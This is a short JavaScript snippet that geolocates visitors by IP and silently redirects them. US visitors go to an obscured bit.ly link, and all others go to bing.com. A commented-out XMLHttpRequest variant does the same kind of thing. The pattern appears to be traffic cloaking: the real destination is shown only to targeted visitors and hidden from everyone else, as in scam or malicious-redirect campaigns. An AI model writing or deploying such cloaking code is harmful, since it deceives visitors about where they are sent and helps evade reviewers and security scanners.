/ Getting the country code from the user's IP
$.get("https://api.ipdata.co?api-key=test", function (response) {
  if (response.country_code == 'US') {
    window.location.href = "https://bit.ly/3rk7ikn";
  }
  else{window.location.href = "http://bing.com/";};
}, "jsonp");

/*var request = new XMLHttpRequest();

request.open('GET', 'https://api.ipdata.co/?api-key=test');

request.setRequestHeader('Accept', 'application/json');

request.onreadystatechange = function () {
  if (this.readyState === 4) {
    //console.log(this.responseText);
    window.location="http://bing.com/";
  }
  else{window.location="https://google.com/";}
};

request.send();
*/
